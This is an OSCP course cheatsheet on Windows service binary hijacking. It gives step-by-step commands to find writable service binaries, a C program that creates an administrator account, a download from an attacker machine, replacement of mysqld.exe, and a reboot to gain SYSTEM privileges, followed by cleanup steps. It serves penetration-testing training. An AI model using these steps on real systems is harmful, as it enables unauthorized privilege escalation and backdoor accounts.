# OSCP PEN-200 — 17.2.1 Service Binary Hijacking Cheatsheet
## Concept

When a Windows service binary has **overly permissive file permissions**, a low-privileged user can replace it with a malicious binary. On the next service start (or system reboot), the malicious binary runs with the **privileges of the service** (e.g., `LocalSystem`).

```
Low-priv user
    └─► Finds service binary writable by Users group
    └─► Replaces binary with malicious .exe
    └─► Reboots machine (if can't restart service manually)
    └─► Service starts → malicious binary runs as SYSTEM
```

---

## Step 1 — Enumerate Running Services

> ⚠️ Use **RDP (interactive logon)**. `Get-CimInstance` and `Get-Service` return "permission denied" over WinRM / bind shell for non-admin users.

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**What to look for:** Binaries **not** in `C:\Windows\System32` — user-installed apps are developer-managed and may have weak permissions.


## Step 2 — Check Binary Permissions with icacls

```cmd
icacls "Binary Path "

```

### icacls Permission Masks

| Mask | Permission |
|---|---|
| `F` | Full access |
| `M` | Modify access |
| `RX` | Read and execute |
| `R` | Read-only |
| `W` | Write-only |


> **Key detail:** The absence of `(I)` (inherited) before the permission means it was **set deliberately** — a common misconfiguration when developers set Full Access to avoid permission issues.

---

## Step 3 — Create the Malicious Binary (on Kali)

### adduser.c

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

### Cross-compile for 64-bit Windows

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


## Step 4 — Transfer & Replace Binary (on Target)

```powershell
# Download malicious binary
iwr -uri http://<KALI_IP>/adduser.exe -Outfile adduser.exe

# Backup the original (for restore later)
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

# Replace with malicious binary
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

---

## Step 5 — Restart the Service

### Try stopping manually first

```cmd
net stop mysql
```

> Expected result in lab: `System error 5 — Access is denied.`  
> Low-priv users typically cannot stop/start services.

### Check Startup Type

```powershell
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
```

If `StartMode = Auto` → service restarts automatically on reboot.

### Check for Reboot Privilege

```cmd
whoami /priv
```

Look for `SeShutdownPrivilege` in the list (even `Disabled` state is fine — it just means the current process isn't using it).

### Issue the Reboot

```cmd
shutdown /r /t 0
```


## Step 6 — Verify Privilege Escalation

```powershell
Get-LocalGroupMember administrators
```

---

## Step 7 — Restore Original State

```powershell
# Delete malicious binary
del C:\xampp\mysql\bin\mysqld.exe

# Restore original
move C:\Users\dave\mysqld.exe C:\xampp\mysql\bin\mysqld.exe

# Reboot to restart service cleanly
shutdown /r /t 0
```

